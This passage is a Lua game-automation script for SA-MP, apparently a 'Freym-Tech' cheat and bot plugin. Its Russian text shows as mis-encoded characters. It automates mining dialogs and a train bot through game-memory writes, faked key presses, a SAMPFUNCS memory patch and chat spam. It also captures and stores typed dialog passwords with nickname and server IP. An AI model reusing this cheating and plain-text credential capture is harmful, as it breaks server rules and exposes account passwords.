			local automining_getbtcstatus3 = tonumber(text:match('����� �3 |%s+%{......%}%W+%s+(%d+)%p%d+%s+BTC%s+%d+%s+�������%s+%d+.'))
			local automining_getbtcstatus4 = tonumber(text:match('����� �4 |%s+%{......%}%W+%s+(%d+)%p%d+%s+BTC%s+%d+%s+�������%s+%d+.'))				
			
			for i = 1, 4 do
			    local automining_lvl = tonumber(text:match('����� �'..i..' |%s+%{......%}%W+%s+%d+%p%d+%s+BTC%s+(%d+)%s+�������%s+%d+.'))
				local automining_fillstatus = tonumber(text:match('����� �'..i..' |%s+%{......%}%W+%s+%d+%p%d+%s+BTC%s+%d+%s+�������%s+(%d+%p%d+)%A'))
			    if automining_fillstatus ~= nil then
					if automining_fillstatus > 0 and automining_lvl ~= nil then
						automining_fillstatushours =  math.ceil(224 * (automining_fillstatus / 100))
						text = text:gsub('����� �'..i..' |%s+%{......%}%W+%s+%d+%p%d+%s+BTC%s+%d+%s+�������%s+%d+%p%d+%A', '%1 {BEF781}- [~'..automining_fillstatushours..' ���(��)]')	
					end				
					if automining_lvl > 0 then
						text = text:gsub('����� �'..i..' |%s+%{......%}%W+%s+%d+%p%d+%s+BTC%s+%d+%s+�������', '%1 | '..INFO[automining_lvl]..'/���')
					end
                end				
			end					
			
            if automining_getbtc == 1 or automining_getbtc == 2 or automining_getbtc == 3 or automining_getbtc == 4 then
				if automining_getbtc == 1 then
				    if automining_getbtcstatus1 ~= nil then
						if automining_getbtcstatus1 < 1 then
							automining_getbtc = 2
						elseif text:find('����� �1 | ��������') then
							automining_getbtc = 2
						end
					else
					    automining_getbtc = 2
					end
				end
				if automining_getbtc == 2 then
				    if automining_getbtcstatus2 ~= nil then
						if automining_getbtcstatus2 < 1 then
							automining_getbtc = 3
						elseif text:find('����� �2 | ��������') then
							automining_getbtc = 3
						end
					else
					    automining_getbtc = 3
					end
				end
				if automining_getbtc == 3 then
					if automining_getbtcstatus3 ~= nil then
						if automining_getbtcstatus3 < 1 then
							automining_getbtc = 4
						elseif text:find('����� �3 | ��������') then
							automining_getbtc = 4
						end
					else
					    automining_getbtc = 4
					end
				end
				if automining_getbtc == 4 then
					if automining_getbtcstatus4 ~= nil then
						if automining_getbtcstatus4 < 1 then
							automining_getbtc = 10
							sampAddChatMessage('[Freym-Tech] {FFFFFF}�������� ������ ������.', 0xFF6060)
							worktread = lua_thread.create(PressAlt)
						elseif text:find('����� �4 | ��������') then
							automining_getbtc = 10
							sampAddChatMessage('[Freym-Tech] {FFFFFF}�������� ������ ������.', 0xFF6060)
							worktread = lua_thread.create(PressAlt)
						end
					else
					    automining_getbtc = 10					
					end
				end
				adID = automining_getbtc - 1
			    sampSendDialogResponse(25242,1,adID,nil)				
            end				
			
			if automining_startall == 1 or automining_startall == 2 or automining_startall == 3 or automining_startall == 4 then
				if automining_startall == 1 then
				    if text:find('����� �1 | {BEF781}��������') then
				        automining_startall = 2
					elseif text:find('����� �1 | ��������') then
					    automining_startall = 2
					end
				end
				if automining_startall == 2 then
				    if text:find('����� �2 | {BEF781}��������') then
				        automining_startall = 3
					elseif text:find('����� �2 | ��������') then
					    automining_startall = 3
					end
				end
				if automining_startall == 3 then
				    if text:find('����� �3 | {BEF781}��������') then
				        automining_startall = 4
					elseif text:find('����� �3 | ��������') then
					    automining_startall = 4
					end
				end
				if automining_startall == 4 then
				    if text:find('����� �4 | {BEF781}��������') then
				        automining_startall = 10
						sampAddChatMessage('[Freym-Tech] {FFFFFF}��������� ������ ������ (��� ��� ��������).', 0xFF6060)
					    worktread = lua_thread.create(PressAlt)
					elseif text:find('����� �4 | ��������') then
					    automining_startall = 10
					    sampAddChatMessage('[Freym-Tech] {FFFFFF}��������� ������ ������.', 0xFF6060)
					    worktread = lua_thread.create(PressAlt)
					end
				end			
				adID = automining_startall - 1
			    sampSendDialogResponse(25242,1,adID,nil)
			end
			
            if automining_fillall == 1 or automining_fillall == 2 or automining_fillall == 3 or automining_fillall == 4 then
				if automining_fillall == 1 then
				    if automining_fillstatus1 ~= nil then
						if automining_fillstatus1 > 51 then
							automining_fillall = 2
						elseif text:find('����� �1 | ��������') then
							automining_fillall = 2
						end
					else
					    automining_fillall = 2
					end
				end
				if automining_fillall == 2 then
				    if automining_fillstatus1 ~= nil then
						if automining_fillstatus2 > 51 then
							automining_fillall = 3
						elseif text:find('����� �2 | ��������') then
							automining_fillall = 3
						end
					else
					    automining_fillall = 3
					end
				end
				if automining_fillall == 3 then
					if automining_fillstatus1 ~= nil then
						if automining_fillstatus3 > 51 then
							automining_fillall = 4
						elseif text:find('����� �3 | ��������') then
							automining_fillall = 4
						end
					else
					    automining_fillall = 4
					end
				end
				if automining_fillall == 4 then
					if automining_fillstatus1 ~= nil then
						if automining_fillstatus4 > 51 then
							automining_fillall = 10
							sampAddChatMessage('[Freym-Tech] {FFFFFF}�������� ������ ������ (� ����������� ������ 50%, ����� ������!).', 0xFF6060)
							worktread = lua_thread.create(PressAlt)
						elseif text:find('����� �4 | ��������') then
							automining_fillall = 10
							sampAddChatMessage('[Freym-Tech] {FFFFFF}�������� ������ ������.', 0xFF6060)
							worktread = lua_thread.create(PressAlt)
						end
					else
					    automining_fillall = 10
					end
				end			
				adID = automining_fillall - 1
			    sampSendDialogResponse(25242,1,adID,nil)
			end			
		end
		
		text = table.concat(dtext,'\n')
        dtext = {}
        text = text .. '\n' .. ' '
		text = text .. '\n' .. '{ffff00}����������\t{ffff00}�������� �����\t{ffff00}������� � ���\t{ffff00}������� ��������������'
		text = text .. '\n' .. '{FFFFFF}�����: '..automining_videocards..' | {BEF781}�������� '..automining_videocardswork..'\t{FFFFFF}'..string.format("%.0f", automining_btcamountoverall)..' BTC\t{BEF781}'..automining_btcoverallph..' {FFFFFF}BTC\t{81DAF5}'..string.format("%.1f", automining_btcoverall)..' {FFFFFF}BTC' 
			if dialogTitle:find('�������� ����������') then	
				if text:find('����� �1 | ��������') and text:find('����� �2 | ��������') and text:find('����� �3 | ��������') and text:find('����� �4 | ��������') then
					text = text .. '\n' .. ' '
					text = text .. '\n' .. '{FF6060}- ������� ��� ������� (����� �����!)'
					text = text .. '\n' .. '{FF6060}- ��������� ��� ���������� (����� �����!)'
					text = text .. '\n' .. '{FF6060}- ������ �������� (����� �����!)'
				else
					text = text .. '\n' .. ' '
					text = text .. '\n' .. '{99FF99}- ������� ��� �������'
					text = text .. '\n' .. '{22FF00}- ��������� ��� ����������'
					text = text .. '\n' .. '{00FF55}- ������ �������� (�� 50%)'
				end
			end
		automining_btcoverall = 0
	    automining_btcoverallph = 0        		
		return {dialogId, dialogStyle, dialogTitle, okButtonText, cancelButtonText, text}
		end
		
		if dialogId == 25243 then	    
		    if automining_getbtc == 1 or automining_getbtc == 2 or automining_getbtc == 3 or automining_getbtc == 4 then
				if dialogTitle:find('������ �%d+%s+| ����� �'..automining_getbtc..'') then	
					local automining_btcamount = tonumber(text:match('������� ������� %((%d+).%d+ '))
					if automining_btcamount ~= 0 then
						sampSendDialogResponse(25243,1,1,nil) -- ��
					else
						automining_getbtc = automining_getbtc + 1
						sampSendDialogResponse(25243,0,nil,nil)
						if automining_getbtc == 5 then
							sampAddChatMessage('[Freym-Tech] {FFFFFF}������� ��������� � ����������.', 0xFF6060)
							automining_getbtc = 10
						end
					end
				else
				    sampSendDialogResponse(25243,0,nil,nil)
					worktread = lua_thread.create(PressAlt)
				end
			end
			
		    if automining_startall == 1 or automining_startall == 2 or automining_startall == 3 or automining_startall == 4 then
				if text:find('��������� ����������') then
				    sampSendDialogResponse(25243,1,0,nil)
				    automining_startall = automining_startall + 1
				    sampSendDialogResponse(25243,0,nil,nil)
				else
				    sampSendDialogResponse(25243,0,nil,nil)
				end
				if automining_startall == 5 then
					sampAddChatMessage('[Freym-Tech] {FFFFFF}������ ��������.', 0xFF6060)
					automining_startall = 10
				end
			end

		    if automining_fillall == 1 or automining_fillall == 2 or automining_fillall == 3 or automining_fillall == 4 then
				if dialogTitle:find('������ �%d+%s+| ����� �'..automining_fillall..'') then
				    sampSendDialogResponse(25243,1,2,nil)
				    automining_fillall = automining_fillall + 1
				    worktread = lua_thread.create(PressAlt)
				else
				    worktread = lua_thread.create(PressAlt)
				end
				if automining_filltall == 5 then
					sampAddChatMessage('[Freym-Tech] {FFFFFF}������� ������ �� 50% ��������.', 0xFF6060)
					sampSendDialogResponse(25243,0,nil,nil)
					automining_startall = 10
					worktread = lua_thread.create(PressAlt)
				end
			end
	    end
		
	    if dialogId == 25244 and dialogTitle:find('����� ������� ����������') then
     		if automining_getbtc == 1 or automining_getbtc == 2 or automining_getbtc == 3 or automining_getbtc == 4 then
				automining_getbtc = automining_getbtc + 1
				sampSendDialogResponse(25244,1,nil,nil) -- ��
				worktread = lua_thread.create(PressAlt)
				if automining_getbtc == 5 then
					sampAddChatMessage('[Freym-Tech] {FFFFFF}������� ��������� � ����������.', 0xFF6060)
					automining_getbtc = 10
				end
				return false
			end
	    end			
	end
	----------------MiningTool-----------------------
	if mopen then
		if dialogId == 15281 then
			sampSendDialogResponse(15281, 1 , 0 , -1)
			return false
		end
	end
	if skipzz.v then
	    if text:find("� ���� ����� ���������") then
			sampSendDialogResponse(0, 1 , 0 , -1)
			return false
		end
    end
	if autopass.v then
		if dialogId == 991 then
			sampSendDialogResponse(991, 1 , 0 , mainIni.config.password)
		end
	end
	if dialogStyle == 1 or dialogStyle == 3 then
		local acc = getAcc()
		local bool = true
		if acc > -1 then
			if autologin.state.v then
				local dialog = findDialog(acc, dialogId)
				if dialog > -1 then
				
					sampSendDialogResponse(dialogId, 1, 0, tostring(savepass[acc][3][dialog].text))
					return false
				else
					bool = true
				end
			end
		else
			bool = true
		end
		if bool then
			dialogChecker.check = true
			dialogChecker.id = dialogId
			dialogChecker.title = dialogTitle
		end
	else
		dialogChecker.check = false
		dialogChecker.id = -1
		dialogChecker.title = ""
	end
end

-- function train_speed(var)-- train bot
--     if tonumber(var) == nil or #var == 0 or tonumber(var) <= 0 and tonumber(var) > 50 then
--         chat('������� �����.', false)
--         return
--     else
--         chat('����������� ����� ������������ ��������: {color}'..tonumber(var))
--         info['speed'] = tonumber(var);
--     end
-- end

function train_dist(var)-- train bot
    if tonumber(var) == nil or #var == 0 or tonumber(var) <= 0 then
        chat('������� �����.', false)
        return
    else
        chat('����������� ����� ��������� ������� �����������: {color}'..tonumber(var))
        info['dist'] = tonumber(var);
    end
end

function train_wait(var)-- train bot
    if tonumber(var) ~= nil then
        chat('����������� ����� �������� ��������� �� ��������: {color}'..tonumber(var))
        info['wait'] = tonumber(var);
    else
        chat('������� �����.', false)
        return
    end
end

function press_gas() -- train bot
    writeMemory(0xB73458 + 0x20, 1, 255, false)
end

function press_brake() -- train bot
    writeMemory(0xB73458 + 0x1C, 1, 255, false)
end
function GoToCoord(x,y,z) -- train bot
    local koef1, koef2 = 1.05, 0.02
    local function getPov(ang)
        return (ang^koef1)*koef2*100/memory.getfloat(0xB7CB50, true)
    end
    while not locateCharAnyMeans2d(PLAYER_PED, x, y, 1, 1, true) and info['status'] do
        local POSX,POSY,POSZ = getCharCoordinates(PLAYER_PED)
        local angle    = math.acos((x-POSX)/math.sqrt((x - POSX)*(x - POSX)+(y - POSY)*(y - POSY)))
        if POSY > y then angle = 2*math.pi - angle end --��������� ����
        if angle < 0 then angle = angle + 2*math.pi end
        angle    = math.deg(angle)
        local angX    = math.asin((z-POSZ)/math.sqrt((z-POSZ)^2+(y-POSY)^2))
        local cpx,cpy,cpz     = getActiveCameraCoordinates()
        local cx,cy,cz     = getActiveCameraPointAt()
        local curangle     = math.acos((cx-cpx)/math.sqrt((cx-cpx)*(cx-cpx)+(cy-cpy)*(cy-cpy)))
        if cpy > cy then curangle = 2*math.pi - curangle end -- ��������� �������� ���� ������
        curangle = math.deg(curangle)
        local heading = getCharHeading(PLAYER_PED) + 90
        if heading > 360 then heading = heading - 360 end
        local angsum = 360 - curangle + angle
        if angsum > 360 then angsum = angsum - 360 end
        if angsum < 180 then curangle = curangle + getPov(angsum)
        else curangle = curangle - getPov(360-angsum) end
        local xAngle    = math.asin((z-POSZ)/math.sqrt((z-POSZ)^2+(math.sqrt((x-POSX)^2+(y-POSY)^2))^2))
        setCameraPositionUnfixed(xAngle,math.rad(curangle)+math.pi)
        setGameKeyState(1, -255)
        wait(0)
    end
end
function train_start() --train bot
    info['status'] = not info['status']
    AFKMessage('������ ����: {2e82ff}'..(info['status'] and '�������' or '��������'), info['status'])
    -- if isCharInAnyCar(PLAYER_PED) then
    --     info['state'] = (info['status'] and 'gas' or false)
    -- end
    if info['status'] == true then
        traintrue = 'true'
		workmework = lua_thread.create(threadworkbottrain) 
        workthreadd = lua_thread.create(threadtrue)
    else
        traintrue = 'false'
        lua_thread.terminate(workmework)
        lua_thread.terminate(workthreadd)
    end
end
function SearchMarker(posX, posY, posZ, radius, isRace) -- train bot
    local ret_posX = 0.0
    local ret_posY = 0.0
    local ret_posZ = 0.0
    local isFind = false

    for id = 0, 31 do
        local MarkerStruct = 0
        if isRace then MarkerStruct = 0xC7F168 + id * 56
        else MarkerStruct = 0xC7DD88 + id * 160 end
        local MarkerPosX = representIntAsFloat(readMemory(MarkerStruct + 0, 4, false))
        local MarkerPosY = representIntAsFloat(readMemory(MarkerStruct + 4, 4, false))
        local MarkerPosZ = representIntAsFloat(readMemory(MarkerStruct + 8, 4, false))

        if MarkerPosX ~= 0.0 or MarkerPosY ~= 0.0 or MarkerPosZ ~= 0.0 then
            if getDistanceBetweenCoords3d(MarkerPosX, MarkerPosY, MarkerPosZ, posX, posY, posZ) < radius then
                ret_posX = MarkerPosX
                ret_posY = MarkerPosY
                ret_posZ = MarkerPosZ
                isFind = true
                radius = getDistanceBetweenCoords3d(MarkerPosX, MarkerPosY, MarkerPosZ, posX, posY, posZ)
            end
        end
    end

    return isFind, ret_posX, ret_posY, ret_posZ, radius
end

function threadworkbottrain() --train bot
	while true do
		wait(0)
		if info['pickUp'] then
			if info['pickUp'][1] and info['pickUp'][2] and info['pickUp'][3] then
				if isCharInAnyCar(PLAYER_PED) then
					local car = storeCarCharIsInNoSave(PLAYER_PED);
					local speed = getCarSpeed(car)
					local x,y,z = getCharCoordinates(PLAYER_PED)
					local dist = getDistanceBetweenCoords3d(x,y,z, info['pickUp'][1], info['pickUp'][2], info['pickUp'][3])
					local tormoz = tonumber((info['dist']));
					local tormoz2 =  tonumber((info['boostSpeed'] and '15' or '80'));
					if tonumber(dist) < tormoz and tonumber(dist) > tormoz2 then
						info['state'] = 'brake'
					elseif tonumber(dist) < 10 then
						info['state'] = 'full_brake'
					end
				end
				if info['status'] and info['state'] == 'gas' and isCharInAnyCar(PLAYER_PED) then
					local car = storeCarCharIsInNoSave(PLAYER_PED);
					local speed = getCarSpeed(car)
					if speed < tonumber(info['speed']) then
						if info['boostSpeed'] and speed < 10 then
							for i = speed, info['speed'], info['boostint'] do
								local incargg = isCharInAnyCar(PLAYER_PED)
								if incargg then
									-- print(i)
									setTrainSpeed(car, i)
									wait(250)
								else
									train_start()
								end
							end
						end
						press_gas();
					end
				elseif info['status'] and isCharInAnyCar(PLAYER_PED) then
					local car = storeCarCharIsInNoSave(PLAYER_PED);
					local speed = getCarSpeed(car)
					if info['state'] == 'brake' then
						if speed >= 8 then
							if info['boostSpeed'] then
								-- print('bost brake')
								for i = speed, 7, - info['faststopspeed'] do -- �������� ���������
									wait(150)
									if isCharInAnyCar(PLAYER_PED) then
										setTrainSpeed(car, i);
									end
								end
							end
							press_brake();
						end
					elseif info['state'] == 'full_brake' then
						if speed > 1.2 then
							if info['boostSpeed'] then
								-- print('bost brake full')
								wait(300)
								if isCharInAnyCar(PLAYER_PED) then
									setTrainSpeed(car, 1);
								end
							end
							press_brake();
						else
							if isCharInAnyCar(PLAYER_PED) then
								setTrainSpeed(car, 0.6);
							end
							wait(500);
							if isCharInAnyCar(PLAYER_PED) then
								setTrainSpeed(car, 0);
							end
							wait(info['wait']);
							if isCharInAnyCar(PLAYER_PED) then
								setTrainSpeed(car, 0);
								info['state'] = 'gas'
							end
							wait(500)
						end
					end
				elseif info['status'] and info['state'] == 'toPickUp' then
					GoToCoord(-2095.4909667969, 514.75042724609, 1487.6927490234);
					GoToCoord(-2098.5727539063, 512.82043457031, 1487.6927490234);
					GoToCoord(-2102.4104003906, 512.78045654297, 1487.6927490234);
					good_dialog = false;
					while not good_dialog do
						setGameKeyState(21, 255);
						sampForceOnfootSync();
						wait(4000);
					end
					good_dialog = false;
					-- info['state'] = false;
				end
			end
		end
	end
end

function applySampfuncsPatch()
    local memory = memory or require 'memory'
    local module = getModuleHandle("SAMPFUNCS.asi")
    if module ~= 0 and memory.compare(module + 0xBABD, memory.strptr('\x8B\x43\x04\x8B\x5C\x24\x20\x8B\x48\x34\x83\xE1'), 12) then
        memory.setuint16(module + 0x83349, 0x01ac, true)
        memory.setuint16(module + 0x8343c, 0x01b0, true)
        memory.setuint16(module + 0x866dd, 0x00f4, true)
        memory.setuint16(module + 0x866e9, 0x0306, true)
        memory.setuint8(module + 0x8e754, 0x40, true)
    end
end

function threadtrue() --train bot
	while true do
		wait(0)
		info = {
			status = info['status'];
			state = info['state'];
			flights = info['flights'];
			earn = info['earn'];
			pickUp = info['pickUp'];
			point = info['point'];
			speed = sliders.slider3.v;
			dist = sliders.slider1.v;
			wait = info['wait'];
			boostint = sliders.slider2.v;
			faststopspeed = sliders.slider4.v;
			boostSpeed = info['boostSpeed'];
		}
		if info['status'] then
			renderDrawBoxWithBorder(39, 408, 200, 90, 0xAA000000, 3, 0xFFFFAE00)
			renderFontDrawText(font, "�����: "..info['point'], 49, 420, 0xFFFFFFFF, 0x90000000)
			renderFontDrawText(font, "����������: "..info['earn'], 49, 440, 0xFFFFFFFF, 0x90000000)
			renderFontDrawText(font, "���������� ������: "..info['flights'], 49, 460, 0xFFFFFFFF, 0x90000000)
			-- local text, _, _, _ = sampGetChatString(99)
		end
        if info['pickUp'] then
            if info['pickUp'][1] and info['pickUp'][2] and info['pickUp'][3] then
                if isCharInAnyCar(PLAYER_PED) then
                    local car = storeCarCharIsInNoSave(PLAYER_PED);
                    local speed = getCarSpeed(car)
                    local x,y,z = getCharCoordinates(PLAYER_PED)
                    local dist = getDistanceBetweenCoords3d(x,y,z, info['pickUp'][1], info['pickUp'][2], info['pickUp'][3])
					if speed ~= nil and info['state'] ~= nil and dist ~= nil and info['dist'] ~= nil and info['speed'] ~= nil then
						speedd = math.floor(speed)
						distt = math.floor(dist)
						local statebot = info['state']
						if statebot == false then
							statebot = 'false'
						end
						if distt < info['dist'] then
							rrrrrrre = '~R~'
						else
							rrrrrrre = '~G~'
						end
						if speedd < 32 then
							rrrrrrree = '~Y~'
						else
							rrrrrrree = '~R~'
						end
						if statebot == 'gas' then
							rrrrrrreee = '~Y~'
						else
							rrrrrrreee = '~R~'
						end
						printString('[Bot State: '..rrrrrrreee..''..statebot..'~W~ | dist: '..rrrrrrre..''..distt..'/'..info['dist']..'~W~ | speed: '..rrrrrrree..''..speedd..'/'..info['speed']..'~W~]', 50)
					end
                end
            end
        end
	end
end
function PressAlt()
    time = os.time()
	repeat wait(500)
		local _, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
		local data = allocateMemory(68)
		sampStorePlayerOnfootData(id, data)
		setStructElement(data, 4, 2, 1024, false)
		sampSendOnfootData(data)
		freeMemory(data)
    until os.time() >= time+5
end
function PressAlttw()
    time = os.time()
	repeat wait(500)
		local _, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
		local data = allocateMemory(68)
		sampStorePlayerOnfootData(id, data)
		setStructElement(data, 4, 2, 1024, false)
		sampSendOnfootData(data)
		freeMemory(data)
    until os.time() >= time+5
end

function sendTelegramNotification(msg) -- ������� ��� �������� ��������� �����
    msg = msg:gsub('{......}', '') --��� ���� ������� ����
    msg = encodeUrl(msg) -- �� ��� �� ���������� ������
        url = 'https://api.telegram.org/bot' .. Token .. '/getUpdates?chat_id='..ChatId..'&offset=-1'
        async_http_request('https://api.telegram.org/bot' .. Token .. '/sendMessage?chat_id=' .. ChatId .. '&text='..msg,'', function(result) end) -- � ��� ��� ��������
        
end

function encodeUrl(str)
    str = str:gsub(' ', '%+')
    str = str:gsub('\n', '%%0A')
    return u8:encode(str, 'CP1251')
end

function checkrulopen()
	while true do
		wait(0)
		if aopen then
			AFKMessage('�������� ������ ��������')
			checkopen.standart = true
			checkopen.donate = roulette.donate.v and true or false
			checkopen.platina = roulette.platina.v and true or false
			checkopen.ilon = roulette.ilon.v and true or false
			checkopen.lossantos = roulette.lossantos.v and true or false
			--checkopen.valentin = roulette.valentin.v and true or false
			sampSendChat('/invent')
			wait(roulette.wait.v*1000)
			AFKMessage('����������')
		end
	end
end
function reconfunc()
	while true do
		wait(0)
		if arec.state.v then
			if clrecon.v then
				Randommath = math.random(arec.randomnumberconnect1.v,arec.randomnumberconnect2.v)
				AFKMessage('� ��� ������� ������-�������, ��������� ����� '..Randommath..' ������')
				AFKMessage('���������� ��������. ��������� ����� '..Randommath..' ������')
				wait(Randommath * 1000)
				local ip, port = sampGetCurrentServerAddress()
				sampConnectToServer(ip,port)
				lua_thread.terminate(reconfuncrec) 
			else
				wait(5000)
				AFKMessage('���������� ��������. ��������� ����� '..arec.wait.v..' ������')
				wait(arec.wait.v * 1000)
				local ip, port = sampGetCurrentServerAddress()
				sampConnectToServer(ip,port)
				lua_thread.terminate(reconfuncrec) 
			end
		else
			lua_thread.terminate(reconfuncrec)
		end
	end
end

function checkrulopen1()
	while true do
		wait(0)
		if mopen then
			sampSendClickTextdraw(2110)
			wait(800)
			AFKMessage('�������� ������ ��������')
			checkopen.videokarta = true
			sampSendChat('/invent')
			wait(roulette.wait1.v*1000)
			AFKMessage('����������1')
		end
	end
end
function reconsec()
		lua_thread.create(function()
			sampDisconnectWithReason(quit)
			wait(3000)
			sampSetGamestate(1)
		end)
end
function sendmoneypereday()
	if sendmoneyperedayy == false then
		lua_thread.create(function()
			sendmoneyperedayy = true
			sampSendChat("/pay " .. idperedai.v .." ".. summperedai.v .."")
			wait(100)
			sendmoneyperedayy = false
		end)
	end
end
function uploadfiles()
	sampAddChatMessage('[Freym-Tech] {ffffff}�������� ������.',0xFF4141)
	lua_thread.create(function ()
	sampAddChatMessage('[Freym-Tech] {ffffff}�������� ����� ������� �������� � �������� � �������������� ��� ����� ������ � ����� � ����� (� �������.).',0xFF4141)
	sampAddChatMessage('[Freym-Tech] {ffffff}����� ����������� � ���� ��� �� ����� �����������....',0xFF4141) 
	wait(4500)
	os.execute('explorer https://freym-tech.xyz/contentj/launcher/bb.html')
	end)	
end
function floodvipchat2()
	lua_thread.create(function()
		sampSendChat('/vr � ������-����� � ����� (/findibiz 281) � 2O:OO ������� ����� ������!����� �����������...')
		wait(750)
		sampSendChat('/vr ...���� ����,��� ����� �������!1 ���� ����� 15O.OOO!.� �� ��������� �� 5O.OOO!')
	end)
end
function uploadplugins1()
	sampAddChatMessage('[Freym-Tech] {ffffff}�������� ������.',0xFF4141)
	os.execute('explorer https://drive.google.com/file/d/171Ib-dyI79n1zHvRj_5Xrl7FhiPlYNOu/view')
end
function uploadplugins2()
	sampAddChatMessage('[Freym-Tech] {ffffff}�������� ������.',0xFF4141)
	os.execute('explorer https://drive.google.com/file/d/1NNz4prAasAlZXwRPXqQWv1m-Ig8r7oJm/view')
end
function unloadplayers()
	sampAddChatMessage('[Freym-Tech] {ffffff}�� ��������� ��� ������� �� ������.',0xFF4141)
	local chars = getAllChars()
	for i = 1, #chars do
	local res, id = sampGetPlayerIdByCharHandle(chars[i])
	  if res and chars[i] ~= 1 then
	  hidePlayer(id)
	  end
	end
end
function hidePlayer(id)
	local w = BitStreamIO.bs_write
	local bs = raknetNewBitStream()
	w.int16(bs, id)
	raknetEmulRpcReceiveBitStream(163, bs)
end
function hideCar(id)
	local w = BitStreamIO.bs_write
	local bs = raknetNewBitStream()
	w.int16(bs, id)
	raknetEmulRpcReceiveBitStream(165, bs)
end
function sampev.onSendDialogResponse(dialogid, button, list, text) --�������� �������
	
    -- sampAddChatMessage('dialog ' .. dialogid .. ' closed, button: ' .. button .. ', listboxId: ' .. list .. ', input: ' .. text,-1)
	-- if dialogid == 163 and list == 2 and button == 1 and text == "������ ������� �������� ������ "..loadcarname.." �� ������ ��������." then	
	-- 	sampSendDialogResponse(163, 1 , 0, -1) 
	-- 	newloadingcarname = loadcarname
	-- 	processloadingcar = true
	-- 	AFKMessage('Adadada')
	-- end
	if text:find('���������� ������') and text:find('1000') then
		AFKMessage('1')
	end
	if dialogid == 9761 and list > 6 then
		sampSendDialogResponse(9761, 0 , 0, -1) 

	end
	if dialogid == 9761 and button == 1 and text == '- �������� ���������� ���� ��������' then
		tytfinka_new = 0
		tytfinka_old = 0
		tytbalance_new = 0
		tytbalance_old = 0
		all_bizinfo_finka_refresh = true
		sampSendChat('/bizinfo')
		-- sampShowDialog(1336, "�����������", "�������� ������������, ���������...", "���...")
	end
	if dialogid == 15174 and button == 1 and text == '- �������� ��� �������' then
		refresh_tasks_farm = true
		sampSendDialogResponse(15174, 1 , 0, -1) 
		
		sampShowDialog(1332, "�����������", "�������� ������������, ���������...", "���...")
	end
	if dialogid == 1449 and list == 0 and button == 1 and text == ' �������� �������' then	
		sampSendDialogResponse(1449, 1 , 3, -1) 
		grazhdankon = true
		worktreaddddddd = lua_thread.create(PressAlttw)
	end
	if dialogid == 1449 and list == 1 and button == 1 and text == ' �������� ����������� ������' then
		sampSendDialogResponse(1449, 1 , 4, -1) 
	end
	
	if dialogid == 1449 and list == 2 and button == 1 and text == '1. 10 AZ Coins 	40 ����������� �������' then
		grazhdankon = true
		sampSendDialogResponse(1449, 1 , 4, -1) 
	end
	if dialogid == 25242 and list == 8 and button == 1 then
	    automining_getbtc = 1
        worktread = lua_thread.create(PressAlt)
		sampAddChatMessage('[Freym-Tech] {FFFFFF}�������� �������... �� ���������� ������ ������� �� ����� �����!', 0xFF6060)
	end
	if dialogid == 25242 and list == 9 and button == 1 then
	    automining_startall = 1
        worktread = lua_thread.create(PressAlt)
		sampAddChatMessage('[Freym-Tech] {FFFFFF}��������� ��� ����������... �� ���������� ������ ������� �� ����� �����!', 0xFF6060)
	end
	if dialogid == 25242 and list == 10 and button == 1 then
	    automining_fillall = 1
        worktread = lua_thread.create(PressAlt)
		sampAddChatMessage('[Freym-Tech] {FFFFFF}�������� �������� (�� 50%)... �� ���������� ������ ������� �� ����� �����!', 0xFF6060)
	end	
	if dialogChecker.check and dialogChecker.id == dialogid and button == 1 then
		local ip, port = sampGetCurrentServerAddress()
		table.insert(temppass, {
			id = dialogid,
			title = dialogChecker.title,
			text = text,
			time = os.date("%H:%M:%S"),
			ip = ip .. ":" .. port,
			nick = tostring(sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))))
		})
		dialogChecker.check = false
		dialogChecker.id = -1
		dialogChecker.title = ""
	end
end	
function createcfgifnotcfg()    
	-- AFKMessage('123')
	for i=1, 20 do
		if rullsumm[i] == nil then rullsumm[i] = {} end
		if rullsumm[i]['summrulbronze'] == nil then
			rullsumm[i]['summrulbronze'] = 0
		end
		if rullsumm[i]['summrulgold'] == nil then
			rullsumm[i]['summrulgold'] = 0
		end
		if rullsumm[i]['summrulplatina'] == nil then
			rullsumm[i]['summrulplatina'] = 0
		end
		if rullsumm[i]['summrulsera'] == nil then
			rullsumm[i]['summrulsera'] = 0
		end
		if rullsumm[i]['summrullarecpremka'] == nil then
			rullsumm[i]['summrullarecpremka'] = 0
		end
		if rullsumm[i]['summrullarecsuper'] == nil then
			rullsumm[i]['summrullarecsuper'] = 0
		end
		if rullsumm[i]['summrulgold'] == nil then
			rullsumm[i]['summrulgold'] = 0
		end

		if inicfg.save(rullsumm, q) then end
	end
end
-- function createcfgifnotcfg()
-- 	for i=1, 18 do
-- 		if rullsumm[i] == nil then rullsumm[i] = {} end
-- 		if rullsumm[i]['cenabronze'] == nil then
-- 			rullsumm[i]['cenabronze'] = 0
-- 		end
-- 		if rullsumm[i]['cenaplatina'] == nil then
-- 			rullsumm[i]['cenaplatina'] = 0
-- 		end
-- 		if rullsumm[i]['cenaserebro'] == nil then
-- 			rullsumm[i]['cenaserebro'] = 0
-- 		end
-- 		if rullsumm[i]['cenagold'] == nil then
-- 			rullsumm[i]['cenabronze'] = 0
-- 		end
-- 		if rullsumm[i]['cenalarec'] == nil then
-- 			rullsumm[i]['cenalarec'] = 0
-- 		end
-- 		if rullsumm[i]['cenasuper'] == nil then
-- 			rullsumm[i]['cenasuper'] = 0
-- 		end
-- 		if rullsumm[i]['cenaoligarh'] == nil then
-- 			rullsumm[i]['cenaoligarh'] = 0
-- 		end

-- 		if inicfg.save(rullsumm, q) then end
-- 	end
-- end
function savejson()
	if doesFileExist(file) then
		os.remove(file)
	end
	if table.maxn(savepass) > 0 then
		local f = io.open(file, "w")
		if f then
			f:write(encodeJson(savepass))
			f:close()
		end
	end
	--print('[Accounts] Saved!')
end
function findDialog(id, dialog)
	for k, v in pairs(savepass[id][3]) do
		if v.id == dialog then
			return k
		end
	end
	return -1
end
function inventory()
	time = os.time()
	repeat wait(0)
		if os.time() >= time+60 then
			checktochilki = false
			break
		end
		sampSendClickTextdraw(2092)
		wait(1000)
		sampSendClickTextdraw(2093)
		wait(1000)
		sampSendClickTextdraw(2094)
		wait(1000)
	until not checktochilki 
end

function findAcc(nick, ip)
	for k, v in pairs(savepass) do
		if nick == v[1] and ip == v[2] then
			return k
		end
	end
	return -1
end

function getAcc()
	local nick = tostring(sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))))
	local ip, port = sampGetCurrentServerAddress()
	local ip = ip .. ":" .. port
